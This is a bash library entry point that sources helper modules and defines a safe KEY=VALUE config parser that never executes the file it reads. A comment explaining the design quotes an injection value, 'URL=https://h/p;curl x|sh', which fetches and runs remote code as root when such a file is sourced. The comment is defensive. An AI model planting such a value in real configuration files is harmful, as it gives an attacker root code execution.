#!/usr/bin/env bash
# Single entry point for the boma shell library.
#
# Service scripts source this file and get logging, notification, platform
# assertions, version arithmetic and filesystem helpers.
#
# Usage:
#   BOMA_LIB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../lib" && pwd)"
#   . "$BOMA_LIB_DIR/boma.sh"

[[ -n "${_BOMA_SH:-}" ]] && return 0
_BOMA_SH=1

BOMA_LIB_DIR="${BOMA_LIB_DIR:-$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)}"
export BOMA_LIB_DIR

# shellcheck source=lib/log.sh
. "$BOMA_LIB_DIR/log.sh"
# shellcheck source=lib/util.sh
. "$BOMA_LIB_DIR/util.sh"
# shellcheck source=lib/version.sh
. "$BOMA_LIB_DIR/version.sh"
# shellcheck source=lib/notify.sh
. "$BOMA_LIB_DIR/notify.sh"
# shellcheck source=lib/preflight.sh
. "$BOMA_LIB_DIR/preflight.sh"

# boma_strict — the shell options every entry-point script should set.
#
# Kept as a function rather than applied on source so that `bats` and other
# callers can source the library for individual helpers without inheriting
# errexit, which interacts badly with test frameworks.
boma_strict() {
    set -euo pipefail
}

# load_config <file> — read a KEY=VALUE configuration file.
#
# The file is PARSED, never sourced. Sourcing is what makes a config file
# dangerous: these files are read as root by systemd timers, and `.` executes
# whatever they contain. Blacklisting substitution syntax is not sufficient —
# `URL=https://h/p;curl x|sh` contains no `$(`, backtick or `${`, yet runs as
# root the moment the file is sourced. Parsing removes the execution step
# entirely, so no blacklist has to be complete.
#
# Values may optionally be wrapped in single or double quotes, which are
# stripped. No expansion of any kind is performed on them.
# Every name assigned by ANY load_config call so far. Callers that re-derive
# values afterwards use boma_config_was_set to avoid clobbering an explicit
# setting from a config file.
#
# Accumulated, never reset per call: install.sh loads boma.env and then
# restic.env, and resetting on the second call made the guard forget everything
# boma.env had set, silently reverting operator-configured paths to defaults.
BOMA_CONFIG_KEYS=()

load_config() {
    local file="$1"
    [[ -r "$file" ]] || die "config file not readable: $file"

    local line lineno=0 key value
    while IFS= read -r line || [[ -n "$line" ]]; do
        lineno=$((lineno + 1))
        [[ -z "${line//[[:space:]]/}" ]] && continue
        [[ "$line" =~ ^[[:space:]]*# ]] && continue

        if [[ ! "$line" =~ ^[[:space:]]*([A-Za-z_][A-Za-z0-9_]*)=(.*)$ ]]; then
            die "invalid line $lineno in $file: expected KEY=VALUE, got: $line"
        fi
        key="${BASH_REMATCH[1]}"
        value="${BASH_REMATCH[2]}"

        # Strip one layer of matching quotes, if present.
        if [[ "$value" == \"*\" && ${#value} -ge 2 ]]; then
            value="${value:1:${#value}-2}"
        elif [[ "$value" == \'*\' && ${#value} -ge 2 ]]; then
            value="${value:1:${#value}-2}"
        fi

        printf -v "$key" '%s' "$value"
        export "${key?}"
        BOMA_CONFIG_KEYS+=("$key")
    done <"$file"
}

# boma_config_was_set <name> — true if the last load_config assigned this key.
boma_config_was_set() {
    local needle="$1" k
    for k in ${BOMA_CONFIG_KEYS+"${BOMA_CONFIG_KEYS[@]}"}; do
        [[ "$k" == "$needle" ]] && return 0
    done
    return 1
}
